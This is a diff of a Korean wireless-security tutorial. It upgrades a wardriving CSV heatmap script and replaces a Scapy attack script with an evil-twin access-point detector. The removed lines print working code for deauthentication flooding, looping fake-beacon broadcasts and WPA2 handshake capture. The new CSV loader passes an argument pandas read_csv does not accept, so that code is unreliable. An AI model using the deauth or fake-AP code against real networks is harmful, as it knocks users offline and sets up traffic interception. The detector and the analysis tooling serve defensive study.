@@ -153,36 +153,214 @@ pip install folium pandas
 
 ```python
 #!/usr/bin/env python3
-"""Kismet CSV → 히트맵 생성"""
-import folium
-import pandas as pd
-from folium.plugins import HeatMap
+"""
+Kismet/WiGLE CSV → 무선 네트워크 분석 및 히트맵 생성 CLI
+사용: python3 wardriving_analyze.py --csv wardriving.csv --out wifi_map.html [--filter WPA2] [--center 37.56,126.97]
+"""
 
-# Kismet CSV 파싱
-df = pd.read_csv('wardriving.csv', skiprows=1, names=[
-    'WigleWifi-1.4', 'appRelease', 'model', 'release',
-    'device', 'display', 'board', 'brand', 'star',
-    'MAC', 'SSID', 'AuthMode', 'FirstSeen', 'Channel',
-    'RSSI', 'CurrentLatitude', 'CurrentLongitude',
-    'AltitudeMeters', 'AccuracyMeters', 'Type'
-])
+from __future__ import annotations
 
-# 유효한 GPS 좌표만 선택
-df = df.dropna(subset=['CurrentLatitude', 'CurrentLongitude'])
-df = df[df['CurrentLatitude'] != 0.0]
+import argparse
+import json
+import sys
+from collections import Counter
+from pathlib import Path
+from typing import Optional
 
-# WPA2 네트워크만 필터
-wpa2 = df[df['AuthMode'].str.contains('WPA2', na=False)]
+try:
+    import pandas as pd
+    HAS_PANDAS = True
+except ImportError:
+    HAS_PANDAS = False
 
-# 히트맵 생성
-m = folium.Map(location=[37.5665, 126.9780], zoom_start=13)  # 서울 기준
+try:
+    import folium
+    from folium.plugins import HeatMap, MarkerCluster
+    HAS_FOLIUM = True
+except ImportError:
+    HAS_FOLIUM = False
 
-heat_data = [[row['CurrentLatitude'], row['CurrentLongitude']] 
-             for _, row in wpa2.iterrows()]
-HeatMap(heat_data).add_to(m)
 
-m.save('wifi_heatmap.html')
-print(f"[+] 히트맵 생성: wifi_heatmap.html ({len(wpa2)}개 AP)")
+# WiGLE/Kismet CSV 컬럼 (WiGLE 1.4 형식)
+_WIGLE_COLUMNS = [
+    "WigleWifi", "appRelease", "model", "release",
+    "device", "display", "board", "brand", "star",
+    "MAC", "SSID", "AuthMode", "FirstSeen", "Channel",
+    "RSSI", "CurrentLatitude", "CurrentLongitude",
+    "AltitudeMeters", "AccuracyMeters", "Type",
+]
+
+
+def load_wigle_csv(csv_path: Path) -> "pd.DataFrame":
+    """WiGLE/Kismet CSV 로드 (헤더 자동 감지)"""
+    # 첫 줄이 메타데이터인 경우 건너뜀
+    with open(csv_path, encoding="utf-8", errors="replace") as fh:
+        first_line = fh.readline()
+    skip = 1 if "WigleWifi" in first_line or "appRelease" in first_line else 0
+
+    df = pd.read_csv(
+        csv_path,
+        skiprows=skip,
+        names=_WIGLE_COLUMNS,
+        on_bad_lines="skip",
+        encoding="utf-8",
+        errors="replace",
+    )
+    return df
+
+
+def clean_df(df: "pd.DataFrame") -> "pd.DataFrame":
+    """좌표 정리 및 숫자 변환"""
+    df = df.copy()
+    for col in ("CurrentLatitude", "CurrentLongitude", "RSSI", "Channel"):
+        df[col] = pd.to_numeric(df[col], errors="coerce")
+
+    df = df.dropna(subset=["CurrentLatitude", "CurrentLongitude"])
+    df = df[df["CurrentLatitude"] != 0.0]
+    df = df[df["CurrentLongitude"] != 0.0]
+    return df
+
+
+def analyze(df: "pd.DataFrame") -> dict:
+    total = len(df)
+    enc_counts = Counter(df["AuthMode"].fillna("UNKNOWN"))
+    channel_counts = Counter(df["Channel"].dropna().astype(int))
+    ssid_counts = Counter(df["SSID"].fillna("(hidden)"))
+
+    return {
+        "total": total,
+        "enc_distribution": dict(enc_counts.most_common(10)),
+        "top_channels": dict(channel_counts.most_common(10)),
+        "top_ssids": dict(ssid_counts.most_common(10)),
+        "avg_rssi": float(df["RSSI"].mean()) if not df["RSSI"].isna().all() else 0.0,
+        "open_networks": int((df["AuthMode"].str.contains("OPN|NONE|OPEN", case=False, na=False)).sum()),
+        "wpa3_count": int((df["AuthMode"].str.contains("WPA3|SAE", case=False, na=False)).sum()),
+    }
+
+
+def build_map(
+    df: "pd.DataFrame",
+    center: tuple[float, float],
+    zoom: int = 13,
+    filter_enc: Optional[str] = None,
+) -> "folium.Map":
+    m = folium.Map(location=list(center), zoom_start=zoom, tiles="CartoDB positron")
+
+    if filter_enc:
+        filtered = df[df["AuthMode"].str.contains(filter_enc, case=False, na=False)]
+    else:
+        filtered = df
+
+    # 히트맵 레이어
+    heat_data = list(zip(
+        filtered["CurrentLatitude"].tolist(),
+        filtered["CurrentLongitude"].tolist(),
+    ))
+    HeatMap(heat_data, radius=10, blur=15, max_zoom=1).add_to(m)
+
+    # 오픈 네트워크 마커 (위험)
+    open_nets = df[df["AuthMode"].str.contains("OPN|NONE|OPEN", case=False, na=False)]
+    if not open_nets.empty:
+        open_cluster = MarkerCluster(name="오픈 네트워크 (위험)").add_to(m)
+        for _, row in open_nets.iterrows():
+            folium.Marker(
+                location=[row["CurrentLatitude"], row["CurrentLongitude"]],
+                popup=f"SSID: {row['SSID']}<br>MAC: {row['MAC']}<br>CH: {row['Channel']}",
+                icon=folium.Icon(color="red", icon="wifi", prefix="fa"),
+            ).add_to(open_cluster)
+
+    folium.LayerControl().add_to(m)
+    return m
+
+
+def print_analysis(stats: dict, as_json: bool = False) -> None:
+    if as_json:
+        print(json.dumps(stats, ensure_ascii=False, indent=2))
+        return
+
+    print(f"\n{'='*60}")
+    print(f"총 AP 수     : {stats['total']:,}")
+    print(f"오픈 네트워크: {stats['open_networks']:,}개 (취약)")
+    print(f"WPA3 네트워크: {stats['wpa3_count']:,}개")
+    print(f"평균 RSSI    : {stats['avg_rssi']:.1f} dBm")
+
+    print("\n[암호화 분포]")
+    for enc, cnt in stats["enc_distribution"].items():
+        bar = "#" * min(cnt * 30 // (stats["total"] or 1), 30)
+        print(f"  {enc:<30} {bar} {cnt}")
+
+    print("\n[상위 채널]")
+    for ch, cnt in stats["top_channels"].items():
+        print(f"  CH {ch:>3}: {cnt}개")
+
+    print("\n[상위 SSID]")
+    for ssid, cnt in stats["top_ssids"].items():
+        print(f"  {ssid:<40} {cnt}개")
+
+
+# ------------------------------------------------------------------ #
+#  CLI
+# ------------------------------------------------------------------ #
+def build_parser() -> argparse.ArgumentParser:
+    parser = argparse.ArgumentParser(
+        description="Kismet/WiGLE CSV 무선 네트워크 분석 및 히트맵 생성기",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="예시:\n"
+               "  python3 wardriving_analyze.py --csv wardriving.csv\n"
+               "  python3 wardriving_analyze.py --csv wardriving.csv --out map.html --filter WPA2\n"
+               "  python3 wardriving_analyze.py --csv wardriving.csv --center 37.56,126.97 --json",
+    )
+    parser.add_argument("--csv", required=True, metavar="FILE", help="WiGLE/Kismet CSV 파일")
+    parser.add_argument("--out", default="wifi_heatmap.html", metavar="FILE",
+                        help="출력 HTML 파일 (기본: wifi_heatmap.html)")
+    parser.add_argument("--filter", metavar="ENC",
+                        help="암호화 필터 (예: WPA2, WPA3, OPEN)")
+    parser.add_argument("--center", metavar="LAT,LON", default="37.5665,126.9780",
+                        help="지도 중심 좌표 (기본: 서울)")
+    parser.add_argument("--zoom", type=int, default=13, help="초기 줌 레벨 (기본: 13)")
+    parser.add_argument("--json", action="store_true", help="통계를 JSON으로 출력")
+    parser.add_argument("--no-map", action="store_true", help="지도 파일 생성 건너뜀")
+    return parser
+
+
+def main() -> None:
+    parser = build_parser()
+    args = parser.parse_args()
+
+    if not HAS_PANDAS:
+        print("pandas 라이브러리 필요: pip install pandas", file=sys.stderr)
+        sys.exit(1)
+
+    csv_path = Path(args.csv)
+    if not csv_path.exists():
+        parser.error(f"파일 없음: {csv_path}")
+
+    print(f"[*] CSV 로드 중: {csv_path}", file=sys.stderr)
+    df = load_wigle_csv(csv_path)
+    df = clean_df(df)
+    print(f"[*] 유효 레코드: {len(df):,}개", file=sys.stderr)
+
+    stats = analyze(df)
+    print_analysis(stats, as_json=args.json)
+
+    if not args.no_map:
+        if not HAS_FOLIUM:
+            print("[경고] folium 없음, 지도 생성 건너뜀: pip install folium", file=sys.stderr)
+        else:
+            try:
+                lat_str, lon_str = args.center.split(",")
+                center = (float(lat_str), float(lon_str))
+            except ValueError:
+                parser.error("--center 형식: 위도,경도 (예: 37.56,126.97)")
+
+            m = build_map(df, center=center, zoom=args.zoom, filter_enc=args.filter)
+            out_path = Path(args.out)
+            m.save(str(out_path))
+            print(f"\n[+] 히트맵 저장: {out_path} ({len(df):,}개 AP)")
+
+
+if __name__ == "__main__":
+    main()
 ```
 
 ---
@@ -232,102 +410,295 @@ aireplay-ng -9 wlan0mon                       # Injection Test
 
 ```python
 #!/usr/bin/env python3
-"""Scapy로 WiFi 패킷 분석 및 조작"""
+"""
+Evil Twin AP 탐지 도구 — 합법적 AP와 동일한 SSID를 가진 가짜 AP 탐지
+사용: sudo python3 evil_twin_detect.py --iface wlan0mon [--whitelist whitelist.json] [--timeout 60]
+"""
 
-from scapy.all import *
-from scapy.layers.dot11 import (Dot11, Dot11Beacon, Dot11Elt, 
-                                  Dot11Deauth, Dot11Auth, RadioTap)
+from __future__ import annotations
+
+import argparse
+import json
+import signal
+import sys
 import time
-import threading
+from collections import defaultdict
+from dataclasses import dataclass, field
+from datetime import datetime
+from pathlib import Path
+from typing import Optional
 
-# ===== AP 스캔 =====
-def scan_aps(interface='wlan0mon', timeout=10):
-    """주변 AP 스캔"""
-    aps = {}
-    
-    def handle_packet(pkt):
-        if pkt.haslayer(Dot11Beacon):
-            bssid = pkt[Dot11].addr2
-            ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
-            channel = int(ord(pkt[Dot11Elt:3].info))
-            
-            if bssid not in aps:
-                aps[bssid] = {'ssid': ssid, 'channel': channel}
-                print(f"[+] AP 발견: {ssid} ({bssid}) CH:{channel}")
-    
-    sniff(iface=interface, prn=handle_packet, timeout=timeout)
-    return aps
-
-# ===== Deauth 공격 =====
-def deauth_attack(interface, bssid, client='FF:FF:FF:FF:FF:FF', count=100):
-    """Deauthentication 패킷 전송"""
-    
-    packet = RadioTap() / Dot11(
-        type=0,     # 관리 프레임
-        subtype=12, # Deauth
-        addr1=client,   # 수신자 (클라이언트 or 브로드캐스트)
-        addr2=bssid,    # 발신자 (AP MAC 스푸핑)
-        addr3=bssid     # BSSID
-    ) / Dot11Deauth(reason=7)  # 이유: Class 3 frame received
-    
-    print(f"[*] Deauth 공격: {client} → {bssid}")
-    for i in range(count):
-        sendp(packet, iface=interface, verbose=False)
-        if i % 10 == 0:
-            print(f"\r[*] {i}/{count} 패킷 전송", end='', flush=True)
-    print(f"\n[+] {count}개 Deauth 패킷 전송 완료")
-
-# ===== 가짜 AP 비콘 생성 =====
-def fake_beacon(interface, ssid='FreeWiFi', bssid=None, channel=6):
-    """가짜 AP 비콘 전송"""
-    
-    if bssid is None:
-        bssid = RandMAC()
-    
-    beacon_frame = RadioTap() / Dot11(
-        type=0,     # 관리 프레임
-        subtype=8,  # Beacon
-        addr1='ff:ff:ff:ff:ff:ff',
-        addr2=bssid,
-        addr3=bssid
-    ) / Dot11Beacon(cap='ESS+privacy') / Dot11Elt(
-        ID='SSID',
-        info=ssid.encode()
-    ) / Dot11Elt(
-        ID='Rates',
-        info=b'\x82\x84\x8b\x96\x24\x30\x48\x6c'
-    ) / Dot11Elt(
-        ID='DSset',
-        info=bytes([channel])
+try:
+    from scapy.all import sniff, sendp, RandMAC
+    from scapy.layers.dot11 import (
+        Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth,
+        Dot11ProbeReq, RadioTap,
     )
-    
-    print(f"[*] 가짜 AP 브로드캐스트: SSID={ssid}, BSSID={bssid}")
-    sendp(beacon_frame, iface=interface, inter=0.1, loop=1)
+    HAS_SCAPY = True
+except ImportError:
+    HAS_SCAPY = False
 
-# ===== 핸드셰이크 탐지 =====
-def detect_handshake(interface, target_bssid):
-    """WPA2 핸드셰이크 탐지"""
-    from scapy.layers.eap import EAPOL
-    
-    eapol_count = {}
-    
-    def handle_pkt(pkt):
-        if pkt.haslayer(EAPOL):
-            bssid = pkt[Dot11].addr2
-            if bssid == target_bssid or pkt[Dot11].addr1 == target_bssid:
-                eapol_count[bssid] = eapol_count.get(bssid, 0) + 1
-                
-                if eapol_count.get(target_bssid, 0) >= 2:
-                    print(f"\n[+] 핸드셰이크 탐지! BSSID: {target_bssid}")
-                    return True
-    
-    print(f"[*] 핸드셰이크 대기 중: {target_bssid}")
-    sniff(iface=interface, prn=handle_pkt, stop_filter=handle_pkt)
+
+# ------------------------------------------------------------------ #
+#  데이터 구조
+# ------------------------------------------------------------------ #
+@dataclass
+class APRecord:
+    bssid: str
+    ssid: str
+    channel: int
+    rssi: int
+    enc: str
+    vendor: str = ""
+    first_seen: str = field(default_factory=lambda: datetime.now().strftime("%H:%M:%S"))
+    last_seen: str = field(default_factory=lambda: datetime.now().strftime("%H:%M:%S"))
+
+
+@dataclass
+class EvilTwinAlert:
+    timestamp: str
+    ssid: str
+    legitimate_bssid: str
+    rogue_bssid: str
+    legitimate_channel: int
+    rogue_channel: int
+    rogue_rssi: int
+    enc_mismatch: bool
+    detail: str
+
+
+# ------------------------------------------------------------------ #
+#  Evil Twin 탐지기
+# ------------------------------------------------------------------ #
+class EvilTwinDetector:
+    def __init__(
+        self,
+        iface: str,
+        whitelist: Optional[dict[str, str]] = None,
+    ) -> None:
+        """
+        whitelist: {bssid: ssid} — 신뢰할 수 있는 합법적 AP 목록
+        """
+        self.iface = iface
+        self.whitelist: dict[str, str] = {
+            k.lower(): v for k, v in (whitelist or {}).items()
+        }
+        # SSID → {bssid: APRecord}
+        self._by_ssid: dict[str, dict[str, APRecord]] = defaultdict(dict)
+        self.alerts: list[EvilTwinAlert] = []
+        self._stop = False
+
+    # ── 패킷 처리 ─────────────────────────────────────────────────────
+    def _extract_beacon_info(self, pkt) -> Optional[tuple]:
+        """(bssid, ssid, channel, rssi, enc) 추출"""
+        dot11 = pkt[Dot11]
+        bssid = (dot11.addr2 or "").lower()
+        if not bssid:
+            return None
+
+        ssid, channel, enc = "", 0, "OPEN"
+        elt = pkt.getlayer(Dot11Elt)
+        while elt:
+            if elt.ID == 0:
+                try:
+                    ssid = elt.info.decode("utf-8", errors="replace").strip("\x00")
+                except Exception:
+                    pass
+            elif elt.ID == 3:
+                try:
+                    channel = int.from_bytes(elt.info, "little")
+                except Exception:
+                    pass
+            elif elt.ID == 48:
+                enc = "WPA2"
+            elif elt.ID == 221 and elt.info[:4] == b"\x00\x50\xf2\x01":
+                if enc != "WPA2":
+                    enc = "WPA"
+            elt = elt.payload.getlayer(Dot11Elt) if elt.payload else None
+
+        rssi = 0
+        if pkt.haslayer(RadioTap):
+            rssi = getattr(pkt[RadioTap], "dBm_AntSignal", 0) or 0
+
+        return bssid, ssid or "(hidden)", channel, rssi, enc
+
+    def _handle(self, pkt) -> None:
+        if not (pkt.haslayer(Dot11) and pkt.haslayer(Dot11Beacon)):
+            return
+
+        info = self._extract_beacon_info(pkt)
+        if info is None:
+            return
+
+        bssid, ssid, channel, rssi, enc = info
+        now = datetime.now().strftime("%H:%M:%S")
+
+        # 기록 갱신
+        if bssid in self._by_ssid[ssid]:
+            self._by_ssid[ssid][bssid].last_seen = now
+            self._by_ssid[ssid][bssid].rssi = rssi
+        else:
+            self._by_ssid[ssid][bssid] = APRecord(
+                bssid=bssid, ssid=ssid, channel=channel,
+                rssi=rssi, enc=enc,
+            )
+            print(f"  [새 AP] {ssid:<30} {bssid}  CH:{channel:2d}  {enc}  {rssi}dBm")
+
+        # Evil Twin 분석
+        self._check_evil_twin(ssid, bssid, channel, rssi, enc)
+
+    def _check_evil_twin(
+        self, ssid: str, bssid: str, channel: int, rssi: int, enc: str
+    ) -> None:
+        peers = self._by_ssid.get(ssid, {})
+        if len(peers) < 2:
+            return  # 동일 SSID AP가 1개뿐이면 분석 불필요
+
+        # 화이트리스트에 있는 합법적 BSSID 찾기
+        legitimate = {b: ap for b, ap in peers.items() if b in self.whitelist}
+        all_aps = list(peers.values())
+
+        if legitimate:
+            for legit_bssid, legit_ap in legitimate.items():
+                for ap in all_aps:
+                    if ap.bssid == legit_bssid:
+                        continue
+                    # 다른 채널이거나 암호화 방식이 다를 때 의심
+                    chan_diff = abs(ap.channel - legit_ap.channel)
+                    enc_mismatch = ap.enc != legit_ap.enc
+                    if chan_diff > 0 or enc_mismatch:
+                        self._raise_alert(
+                            ssid=ssid,
+                            legit=legit_ap,
+                            rogue=ap,
+                            enc_mismatch=enc_mismatch,
+                        )
+        else:
+            # 화이트리스트 없음: 동일 SSID 다채널 AP를 경고
+            if len(peers) >= 2:
+                channels = {ap.channel for ap in all_aps}
+                if len(channels) > 1:
+                    first, *rest = all_aps
+                    for rogue in rest:
+                        if rogue.channel != first.channel:
+                            self._raise_alert(
+                                ssid=ssid, legit=first, rogue=rogue,
+                                enc_mismatch=first.enc != rogue.enc,
+                            )
+
+    def _raise_alert(
+        self, ssid: str, legit: APRecord, rogue: APRecord, enc_mismatch: bool
+    ) -> None:
+        # 중복 알림 방지
+        for existing in self.alerts:
+            if existing.ssid == ssid and existing.rogue_bssid == rogue.bssid:
+                return
+
+        reasons = []
+        if abs(rogue.channel - legit.channel) > 0:
+            reasons.append(f"채널 불일치 (합법:{legit.channel} vs 의심:{rogue.channel})")
+        if enc_mismatch:
+            reasons.append(f"암호화 불일치 (합법:{legit.enc} vs 의심:{rogue.enc})")
+
+        detail = " | ".join(reasons) if reasons else "동일 SSID 중복 감지"
+
+        alert = EvilTwinAlert(
+            timestamp=datetime.now().strftime("%H:%M:%S"),
+            ssid=ssid,
+            legitimate_bssid=legit.bssid,
+            rogue_bssid=rogue.bssid,
+            legitimate_channel=legit.channel,
+            rogue_channel=rogue.channel,
+            rogue_rssi=rogue.rssi,
+            enc_mismatch=enc_mismatch,
+            detail=detail,
+        )
+        self.alerts.append(alert)
+        print(
+            f"\n  \033[91m[!!! EVIL TWIN 의심 !!!]\033[0m SSID='{ssid}'\n"
+            f"    합법적 AP : {legit.bssid}  CH:{legit.channel}  {legit.enc}\n"
+            f"    의심 AP   : {rogue.bssid}  CH:{rogue.channel}  {rogue.enc}  RSSI:{rogue.rssi}dBm\n"
+            f"    이유      : {detail}\n"
+        )
+
+    # ── 실행 ─────────────────────────────────────────────────────────
+    def start(self, timeout: int = 0) -> None:
+        signal.signal(signal.SIGINT, lambda s, f: setattr(self, "_stop", True))
+        print(f"[*] Evil Twin 탐지 시작: {self.iface}", file=sys.stderr)
+        sniff(
+            iface=self.iface,
+            prn=self._handle,
+            store=False,
+            timeout=timeout if timeout > 0 else None,
+            stop_filter=lambda _: self._stop,
+        )
+
+    def print_summary(self) -> None:
+        total_ssids = len(self._by_ssid)
+        total_aps = sum(len(v) for v in self._by_ssid.values())
+        print(f"\n{'='*65}")
+        print(f"스캔 결과: SSID {total_ssids}개 / AP {total_aps}개")
+        print(f"Evil Twin 의심 경보: {len(self.alerts)}건")
+        if self.alerts:
+            print()
+            for a in self.alerts:
+                print(f"  [{a.timestamp}] SSID='{a.ssid}'")
+                print(f"    합법: {a.legitimate_bssid} CH:{a.legitimate_channel}")
+                print(f"    의심: {a.rogue_bssid} CH:{a.rogue_channel} ({a.detail})")
+
+
+# ------------------------------------------------------------------ #
+#  CLI
+# ------------------------------------------------------------------ #
+def build_parser() -> argparse.ArgumentParser:
+    parser = argparse.ArgumentParser(
+        description="Evil Twin AP 탐지 도구 (Scapy 기반)",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="화이트리스트 JSON 형식:\n"
+               '  {"aa:bb:cc:dd:ee:ff": "MyCorpWiFi", ...}\n\n'
+               "예시:\n"
+               "  sudo python3 evil_twin_detect.py --iface wlan0mon\n"
+               "  sudo python3 evil_twin_detect.py --iface wlan0mon --whitelist known_aps.json --timeout 120",
+    )
+    parser.add_argument("--iface", required=True, help="모니터 모드 인터페이스")
+    parser.add_argument(
+        "--whitelist", metavar="FILE",
+        help="신뢰할 수 있는 AP 목록 JSON 파일 ({bssid: ssid})",
+    )
+    parser.add_argument(
+        "--timeout", type=int, default=0,
+        metavar="SEC",
+        help="탐지 시간(초). 0=무한 (기본: 0)",
+    )
+    return parser
+
+
+def main() -> None:
+    if not HAS_SCAPY:
+        print("scapy 라이브러리 필요: pip install scapy", file=sys.stderr)
+        sys.exit(1)
+
+    parser = build_parser()
+    args = parser.parse_args()
+
+    whitelist: dict[str, str] = {}
+    if args.whitelist:
+        wl_path = Path(args.whitelist)
+        if not wl_path.exists():
+            parser.error(f"화이트리스트 파일 없음: {wl_path}")
+        try:
+            whitelist = json.loads(wl_path.read_text(encoding="utf-8"))
+        except (json.JSONDecodeError, OSError) as exc:
+            parser.error(f"화이트리스트 파일 오류: {exc}")
+        print(f"[*] 화이트리스트 로드: {len(whitelist)}개 AP", file=sys.stderr)
+
+    detector = EvilTwinDetector(iface=args.iface, whitelist=whitelist)
+    detector.start(timeout=args.timeout)
+    detector.print_summary()
+
 
 if __name__ == "__main__":
-    # AP 스캔
-    aps = scan_aps('wlan0mon', timeout=15)
-    print(f"\n총 {len(aps)}개 AP 발견")
+    main()
 ```
 
 ---
